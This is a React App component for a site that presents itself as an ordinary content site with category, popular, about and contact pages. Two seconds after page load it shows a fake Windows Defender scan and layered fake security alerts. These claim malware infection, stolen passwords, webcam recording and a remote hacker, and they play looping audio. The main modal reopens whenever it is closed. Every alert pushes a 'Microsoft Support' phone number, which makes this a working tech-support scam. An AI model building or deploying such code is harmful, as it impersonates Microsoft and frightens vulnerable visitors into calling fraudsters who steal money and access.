import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Route, Routes } from "react-router-dom";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import { useState, useEffect, useRef } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
  DialogFooter,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import Index from "./pages/Index.tsx";
import Categories from "./pages/Categories.tsx";
import Popular from "./pages/Popular.tsx";
import About from "./pages/About.tsx";
import Contact from "./pages/Contact.tsx";
import NotFound from "./pages/NotFound.tsx";
import img1 from "./assets/pop/Windows_Defender_logo.svg";
import img2 from "./assets/pop/microsoft-logo-svgrepo-com.svg";
import img4 from "./assets/pop/sheld.png";
import img5 from "./assets/pop/new.png";
const audioFile = "/audio.mpeg";

// Create a global audio instance that can be triggered by user interaction
let globalAudio: HTMLAudioElement | null = null;
let audioInitialized = false;

const queryClient = new QueryClient();

const App = () => {
  const [showModal, setShowModal] = useState(false);
  const [showMainDialog, setShowMainDialog] = useState(false);
  const [showBottomText, setShowBottomText] = useState(false);
  const [showScanner, setShowScanner] = useState(false);
  const [scannerProgress, setScannerProgress] = useState(0);
  const [showBackgroundModals, setShowBackgroundModals] = useState([false, false, false]);
  const [showTopOverlay, setShowTopOverlay] = useState(false);
  const [acknowledged, setAcknowledged] = useState(false);
  const audioRef = useRef<HTMLAudioElement | null>(null);
  const [audioReady, setAudioReady] = useState(false);

  // Initialize audio when component mounts
  useEffect(() => {
    // Create audio element
    const audio = new Audio(audioFile);
    audio.loop = true;
    audio.volume = 0.3;
    audio.preload = 'auto';
    
    // Add event listeners
    const handleCanPlay = () => {
      console.log('Audio can play');
      setAudioReady(true);
      globalAudio = audio;
      audioInitialized = true;
    };
    
    const handleError = (e: any) => {
      console.log('Audio error:', e);
      console.log('Audio src:', audioFile);
    };
    
    audio.addEventListener('canplay', handleCanPlay);
    audio.addEventListener('error', handleError);
    
    // Try to load the audio
    audio.load();
    audioRef.current = audio;
    
    return () => {
      audio.removeEventListener('canplay', handleCanPlay);
      audio.removeEventListener('error', handleError);
      audio.pause();
      audioRef.current = null;
      globalAudio = null;
      audioInitialized = false;
    };
  }, []);

  // Add a click listener to enable audio (browser requirement)
  useEffect(() => {
    const enableAudio = () => {
      if (globalAudio && audioReady && !globalAudio.paused) {
        // Audio is already playing
        return;
      }
    };
    
    document.addEventListener('click', enableAudio, { once: true });
    
    return () => {
      document.removeEventListener('click', enableAudio);
    };
  }, [audioReady]);

  // Play/pause audio based on modal visibility
  useEffect(() => {
    const anyModalShown = showScanner || showModal || showMainDialog || showBackgroundModals.some(Boolean) || showTopOverlay;
    
    console.log('Modal shown:', anyModalShown, 'Audio ready:', audioReady);
    
    if (anyModalShown && globalAudio && audioReady) {
      const playPromise = globalAudio.play();
      if (playPromise !== undefined) {
        playPromise.catch(err => {
          console.log('Audio play failed:', err);
          // Try to play on next user interaction
          document.addEventListener('click', () => {
            globalAudio?.play().catch(e => console.log('Retry failed:', e));
          }, { once: true });
        });
      }
    } else if (!anyModalShown && globalAudio) {
      globalAudio.pause();
    }
  }, [showScanner, showModal, showMainDialog, showBackgroundModals, showTopOverlay, audioReady]);

  useEffect(() => {
    if (!acknowledged) {
      const timer1 = setTimeout(() => {
        setShowScanner(true);
        setShowBottomText(true);
      }, 2000);

      const timer2 = setTimeout(() => {
        setShowTopOverlay(true);
      }, 5000);
      
      return () => {
        clearTimeout(timer1);
        clearTimeout(timer2);
      };
    }
  }, [acknowledged]);

  useEffect(() => {
    if (showScanner) {
      const interval = setInterval(() => {
        setScannerProgress((prev) => {
          if (prev >= 100) {
            clearInterval(interval);
            setTimeout(() => {
              setShowScanner(false);
              setShowModal(true);
              // Show background modals for cool effect
              setTimeout(() => setShowBackgroundModals([true, false, false]), 200);
              setTimeout(() => setShowBackgroundModals([true, true, false]), 400);
              setTimeout(() => setShowBackgroundModals([true, true, true]), 600);
              setTimeout(() => {
                setShowMainDialog(true);
              }, 1500);
            }, 300);
            return 100;
          }
          return prev + 4;
        });
      }, 30);
      
      return () => clearInterval(interval);
    }
  }, [showScanner]);

  const handleOpenChange = (open: boolean) => {
    setShowModal(open);
    if (!open && !acknowledged) {
      setTimeout(() => setShowModal(true), 500);
    }
  };

  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Sonner />
        {/* scanner dialog */}
        <Dialog open={showScanner}>
          <DialogContent className="max-w-[500px] bg-white border border-gray-300 shadow-xl" style={{ backgroundColor: 'white' }}>
            <div className="bg-gradient-to-r from-blue-600 to-blue-700 text-white p-4 -m-6 mb-4">
              <div className="flex items-center gap-3">
                <img className="w-8 h-8" src={img1} alt="Windows Defender" />
                <div>
                  <h2 className="text-lg font-bold">Windows Security</h2>
                  <p className="text-xs opacity-90">Real-time protection</p>
                </div>
              </div>
            </div>
            
            <div className="space-y-4">
              <div className="flex items-center gap-3 p-3 bg-blue-50 rounded-lg">
                <img className="w-6 h-6 animate-spin" src={img4} alt="Scanning" />
                <div className="flex-1">
                  <p className="text-sm font-medium text-gray-800">Quick scan in progress...</p>
                  <p className="text-xs text-gray-600">Scanning: C:\\Windows\\System32\\*</p>
                </div>
                <span className="text-sm font-bold text-blue-600">{scannerProgress}%</span>
              </div>
              
              <div className="space-y-2">
                <div className="w-full bg-gray-100 rounded-full h-3 overflow-hidden">
                  <div 
                    className="bg-gradient-to-r from-blue-500 to-blue-600 h-3 rounded-full transition-all duration-200 ease-linear"
                    style={{ width: `${scannerProgress}%` }}
                  />
                </div>
                <div className="flex justify-between text-xs text-gray-500">
                  <span>Items scanned: {Math.floor(scannerProgress * 12.7)}</span>
                  <span>Threats found: 1</span>
                </div>
              </div>
              
              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
                <div className="flex items-start gap-2">
                  <div className="w-2 h-2 bg-yellow-500 rounded-full mt-1"></div>
                  <div>
                    <p className="text-sm font-medium text-yellow-800">Threat detected!</p>
                    <p className="text-xs text-yellow-700">App_Ads.fancetrack(2).dll - Trojan Spyware</p>
                  </div>
                </div>
              </div>
              
              <div className="text-center text-xs text-gray-500 space-y-1">
                <p>Windows Defender is protecting your PC</p>
                <p>Scan will complete shortly...</p>
              </div>
            </div>
            
            <div className="flex justify-between items-center mt-4 pt-4 border-t border-gray-200">
              <img className="w-10 opacity-60" src={img2} alt="Microsoft" />
              <button className="text-xs text-gray-500 hover:text-gray-700">Cancel scan</button>
            </div>
          </DialogContent>
        </Dialog>

        {/* Top Overlay Dialog */}
        <Dialog open={showTopOverlay}>
          <DialogContent className="fixed top-10 w-full rounded-none border-0 bg-black text-white p-3 text-center z-[150]" style={{ backgroundColor: 'black' }}>
            <div className="flex flex-col items-center justify-center">
              <p className="text-xs font-bold">Do not restart or use your computer.</p>
              <p className="text-xs">Your computer is disabled. Please call Microsoft.</p>
              <p className="text-xs">Access is the block security reason for this computer.</p>
              <p className="text-xs">Please contact us immediately. A technician will help you solve the problem.</p>
            </div>
          </DialogContent>
        </Dialog>

        {/* blue background dialog */}
        <Dialog open={showModal}>
          <DialogContent className="max-w-[550px] h-[550px] border-0 rounded-none" style={{ backgroundColor: '#1873e8' }}>
            <div className="w-full h-full flex items-center justify-center rounded-none">
              <div className="text-white flex flex-col justify-center text-center">
                <span className="text-xl font-bold mb-4">
                  Windows-Defender - Security Warning
                </span>
                <p className="text-sm  mb-6">
                  **ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS**
                </p>
                <p className="text-sm text-left mb-4">
                  Your computer has alerted us that it has been infected with a
                  DOSAttack Spyware. The following data has been compromised:
                </p>
                <ul className="text-sm text-left list-disc pl-4">
                  <li>Email Credentials</li>
                  <li>Browser History</li>
                  <li>System Files</li>
                  <li>Network Configuration</li>
                  <li>Installed Software</li>
                  <li>Recent Files</li>
                  <li>Browser History</li>
                  <li>System Files</li>
                  <li>Network Configuration</li>
                  <li>Installed Software</li>
                  <li>Recent Files</li>
                </ul>
              </div>
            </div>

            <div className="flex justify-between  gap-4">
              <span className=" w-full"></span>
              <span className="  flex justify-content items-center gap-2">
                <Button className=" text-white bg-[#1873e8]  border">
                  Cancel
                </Button>
                <Button className=" text-white bg-[#1873e8] border">OK</Button>
              </span>
            </div>
          </DialogContent>
        </Dialog>

        {/* main dialog */}
        <Dialog open={showMainDialog}>
          <DialogContent className="max-w-[400px]" style={{ backgroundColor: 'white' }}>
            <DialogHeader>
              <DialogTitle className="new-font flex justify-content items-center gap-2">
                {" "}
                <span>
                  <img className="w-5" src={img1} alt="" srcSet="" />
                </span>{" "}
                <p className="font-black text-black text-xl">
                  Windows Defender Security Center
                </p>
              </DialogTitle>
              <hr />
              <DialogDescription>
                <div className="text-red-600 flex flex-col justify-content items-center  text-sm font-medium space-y-1">
                  <p>App_Ads.fancetrack(2).dll</p>
                  <p>Threat Detected: Trojan Spyware</p>
                  <img className=" h-40" src={img4} alt="" />

                  <p className="text-gray-600 text-sm space-y-2 ">
                    Access to this PC has been blocked for security reasons.
                  </p>

                  <p className="text-blue-700 font-medium text-sm space-y-2">
                    Contact Windows Support :
                    <span className="ml-2 inline-block px-2 py-0.5 border border-gray-300 rounded bg-gray-50 text-gray-800">
                      +1-888-203-0975 (Security Helpline)
                    </span>
                  </p>
                </div>
              </DialogDescription>
            </DialogHeader>
            <hr />
            <DialogFooter className="flex justify-between  gap-4">
              <span className=" w-full">
                <img className=" w-20" src={img2} alt="" />
              </span>
              <span className="  flex justify-content items-center gap-2">
                <Button className=" bg-[#faf8f5] text-black hover:bg-gray-200 border">
                  Cancel
                </Button>
                <Button className=" bg-blue-900/95 text-white hover:bg-blue-600 border">
                  OK
                </Button>
              </span>
            </DialogFooter>
          </DialogContent>
        </Dialog>

        {/* Background modals for cool effect */}
        <Dialog open={showBackgroundModals[0]}>
          <DialogContent className="max-w-[500px] bg-blue-900/95 backdrop-blur-sm border border-blue-700 rounded-lg shadow-2xl" style={{ backgroundColor: 'rgba(30, 58, 138, 0.95)' }}>
            <div className="text-white space-y-4">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center animate-pulse">
                  <span className="text-white font-bold text-xl">!</span>
                </div>
                <div>
                  <h3 className="text-xl font-bold">CRITICAL SYSTEM ALERT</h3>
                  <p className="text-xs text-blue-300">Threat Level: SEVERE</p>
                </div>
              </div>
              
              <div className="bg-blue-800/50 p-3 rounded border border-blue-600">
                <p className="text-sm font-bold mb-2">Malware Detected:</p>
                <p className="text-xs mb-1">• Trojan.GenericKD.456789</p>
                <p className="text-xs mb-1">• Backdoor.Win32.Radmin.gen</p>
                <p className="text-xs mb-1">• Worm.Win32.AutoRun.aaa</p>
                <p className="text-xs">• Spyware.Keylogger.Flux</p>
              </div>
              
              <div className="space-y-2">
                <p className="text-sm font-bold">System Files Compromised:</p>
                <div className="text-xs space-y-1">
                  <p> C:\Windows\System32\kernel32.dll - INFECTED</p>
                  <p> C:\Windows\System32\user32.dll - MODIFIED</p>
                  <p> C:\Windows\Registry\regedit.exe - CORRUPTED</p>
                  <p> C:\Program Files\browser.exe - TROJANIZED</p>
                  <p> C:\Users\%USER%\Documents\*.doc - ENCRYPTED</p>
                </div>
              </div>
              
              <div className="bg-[#1873e8]/50 p-2 rounded border border-[#1873e8]/70">
                <p className="text-xs font-bold text-white">⚠ IMMEDIATE ACTION REQUIRED ⚠</p>
                <p className="text-xs">System will restart in 2:00 minutes</p>
              </div>
              
              <div className="flex gap-2">
                <button className="flex-1 bg-[#1873e8] text-white px-4 py-2 rounded text-sm font-bold hover:bg-[#1e5fc7]">REMOVE ALL</button>
                <button className="flex-1 bg-blue-700 text-white px-4 py-2 rounded text-sm hover:bg-blue-600">QUARANTINE</button>
              </div>
            </div>
          </DialogContent>
        </Dialog>

        <Dialog open={showBackgroundModals[1]}>
          <DialogContent className="max-w-[480px] bg-blue-900/95 backdrop-blur-sm border border-blue-700 rounded-lg shadow-2xl" style={{ backgroundColor: 'rgba(30, 58, 138, 0.95)' }}>
            <div className="text-white space-y-4">
              <div className="flex items-center gap-3">
                <img className="w-10 h-10 animate-spin" src={img4} alt="Warning" />
                <div>
                  <h3 className="text-xl font-bold">NETWORK SECURITY BREACH</h3>
                  <p className="text-xs text-blue-300">Multiple Intrusions Detected</p>
                </div>
              </div>
              
              <div className="space-y-3">
                <div className="bg-[#1873e8]/50 p-3 rounded">
                  <p className="text-sm font-bold mb-2">Unauthorized Access Attempts:</p>
                  <div className="text-xs space-y-1">
                    <p> IP: 192.168.1.100 - PORT: 8080 - FAILED LOGIN</p>
                    <p> IP: 10.0.0.45 - PORT: 443 - BRUTE FORCE ATTACK</p>
                    <p> IP: 172.16.0.23 - PORT: 22 - SSH INTRUSION</p>
                    <p> IP: 203.0.113.1 - PORT: 3389 - RDP HACKING</p>
                  </div>
                </div>
                
                <div className="bg-[#1873e8]/50 p-3 rounded border border-[#1873e8]/70">
                  <p className="text-sm font-bold text-white">Data Exfiltration Detected:</p>
                  <div className="text-xs space-y-1">
                    <p> Uploading: 2.4 GB of sensitive data</p>
                    <p> Destination: Unknown server in Eastern Europe</p>
                    <p> Files: Documents, passwords, browser history</p>
                    <p> Speed: 1.2 MB/s (Ongoing)</p>
                  </div>
                </div>
                
                <div className="space-y-2">
                  <p className="text-sm font-bold">Firewall Status:</p>
                  <div className="text-xs space-y-1">
                    <p> Windows Firewall - DISABLED by malware</p>
                    <p> Network Protection - COMPROMISED</p>
                    <p> Router Security - BYPASSED</p>
                    <p> VPN Connection - HIJACKED</p>
                  </div>
                </div>
              </div>
              
              <div className="bg-[#1873e8]/50 p-2 rounded border border-[#1873e8]/70 animate-pulse">
                <p className="text-xs font-bold text-white">⚠ NETWORK ISOLATION RECOMMENDED ⚠</p>
              </div>
            </div>
          </DialogContent>
        </Dialog>

        <Dialog open={showBackgroundModals[2]}>
          <DialogContent className="max-w-[520px] bg-blue-900/95 backdrop-blur-sm border border-blue-700 rounded-lg shadow-2xl" style={{ backgroundColor: 'rgba(30, 58, 138, 0.95)' }}>
            <div className="text-white space-y-4">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-blue-600 rounded flex items-center justify-center animate-pulse">
                  <span className="text-white text-xl">⚠</span>
                </div>
                <div>
                  <h3 className="text-xl font-bold">PRIVACY & DATA BREACH</h3>
                  <p className="text-xs text-blue-300">Critical Information Compromised</p>
                </div>
              </div>
              
              <div className="space-y-3">
                <div className="bg-[#1873e8]/50 p-3 rounded">
                  <p className="text-sm font-bold mb-2">Personal Data Stolen:</p>
                  <div className="text-xs space-y-1">
                    <p>Passwords: 24 accounts compromised</p>
                    <p> Banking: 3 credit cards exposed</p>
                    <p> Email: 472 contacts accessed</p>
                    <p> Social Media: All profiles hacked</p>
                    <p> ID Documents: Passport, Driver's License copied</p>
                  </div>
                </div>
                
                <div className="bg-[#1873e8]/50 p-3 rounded border border-[#1873e8]/70">
                  <p className="text-sm font-bold text-white mb-2">Active Data Theft:</p>
                  <div className="text-xs space-y-1">
                    <p> Currently uploading: Tax returns (2019-2024)</p>
                    <p> Currently uploading: Medical records</p>
                    <p> Currently uploading: Family photos/videos</p>
                    <p> Currently uploading: Work documents</p>
                    <p> Progress: 67% complete - 3:24 remaining</p>
                  </div>
                </div>
                
                <div className="space-y-2">
                  <p className="text-sm font-bold">System Vulnerabilities:</p>
                  <div className="text-xs space-y-1">
                    <p> Operating System: 14 critical exploits</p>
                    <p> Browser: 8 zero-day vulnerabilities</p>
                    <p> Apps: 23 malware infections detected</p>
                    <p> Encryption: RSA-2048 keys broken</p>
                    <p> Hardware: BIOS firmware corrupted</p>
                  </div>
                </div>
                
                <div className="bg-[#1873e8]/50 p-3 rounded border border-[#1873e8]/70">
                  <p className="text-sm font-bold text-white">Remote Access Active:</p>
                  <div className="text-xs space-y-1">
                    <p>Hacker Location: Moscow, Russia</p>
                    <p> Remote Control: Full desktop access</p>
                    <p> Webcam: Currently recording</p>
                    <p> Microphone: Currently listening</p>
                    <p> Keystrokes: Being logged in real-time</p>
                  </div>
                </div>
              </div>
              
              <div className="bg-[#1873e8]/50 p-3 rounded border border-[#1873e8]/70 animate-pulse">
                <p className="text-xs font-bold text-white text-center">⚠️ IMMEDIATE EMERGENCY RESPONSE REQUIRED ⚠️</p>
                <p className="text-xs text-center">Call Microsoft Support: +1-888-203-0975</p>
              </div>
            </div>
          </DialogContent>
        </Dialog>

        {showBottomText && (
        <div className="fixed flex-col bottom-0 left-0 w-screen bg-[#1873e8] text-white flex justify-center items-center z-[100] py-1">
          <div className="flex items-center justify-center gap-10 py-1">
            <img className="w-20" src={img5} alt="" />
            <h2 className="new-font">Contact Support 1-8702288568 (Toll Free)</h2>
          </div>
          <p className=" text-xs px-2">
            Warning! An unrecognized app from starting. Running this app might
            put your PC at risk. Windows Defender SmartScreen has found
            potentially unwanted Adware on this device that can steal your
            passwords, online identity, financial information, personal files,
            pictures or documents.
          </p>
        </div>
        )}

        <BrowserRouter>
          <Routes>
            <Route path="/" element={<Index />} />
            <Route path="/categories" element={<Categories />} />
            <Route path="/popular" element={<Popular />} />
            <Route path="/about" element={<About />} />
            <Route path="/contact" element={<Contact />} />
            <Route path="*" element={<NotFound />} />
          </Routes>
        </BrowserRouter>
      </TooltipProvider>
    </QueryClientProvider>
  );
};

export default App;
